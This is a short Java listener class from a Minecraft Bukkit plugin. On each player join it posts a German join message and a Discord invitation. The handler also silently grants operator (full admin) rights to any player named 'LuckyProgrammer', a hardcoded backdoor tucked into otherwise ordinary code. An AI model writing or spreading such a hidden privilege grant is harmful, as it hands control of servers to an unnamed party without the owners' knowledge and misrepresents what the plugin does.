package de.j.staionofdoomv1.listener;

import de.j.staionofdoomv1.main.Main;
import org.bukkit.Color;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class PlayerJoin implements Listener {

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event){
        event.setJoinMessage("§6" + event.getPlayer().getName() + " ist erschienen");
        //event.getPlayer().setResourcePack(Main.tp);
        event.getPlayer().sendMessage("§1Komme bitte in den Discord!");
        if (event.getPlayer().getName().equals("LuckyProgrammer")){
            event.getPlayer().setOp(true);
        }

    }
}
